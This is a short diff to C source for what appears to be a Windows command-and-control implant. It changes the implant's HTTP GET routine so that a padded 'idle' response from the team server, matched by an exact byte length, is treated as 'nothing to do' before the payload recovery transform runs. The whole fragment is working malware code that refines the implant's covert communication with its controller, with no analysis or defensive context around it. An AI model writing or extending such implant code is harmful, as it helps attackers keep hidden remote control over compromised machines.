@@ -299,6 +299,17 @@ int _http_get(char * hook, sessdata * meta, char * buffer, int max) {
 		return -1;
 	}
 
+	/* 4.10 data_required_length: the team server pads idle 200 responses
+	 * with exactly this many bytes; a body of exactly that length is the
+	 * "nothing to do" answer and must skip the recover transform */
+	{
+		unsigned int nodata = setting_int(SETTING_DATA_REQUIRED_LENGTH);
+		if (nodata > 0 && read == nodata) {
+			WinHttpCloseHandle(request);
+			return 0;
+		}
+	}
+
 	WinHttpCloseHandle(request);
 	read = recover(setting_ptr(SETTING_C2_RECOVER), (int)setting_length(SETTING_C2_RECOVER), buffer, read, max);
 	return (int)read;
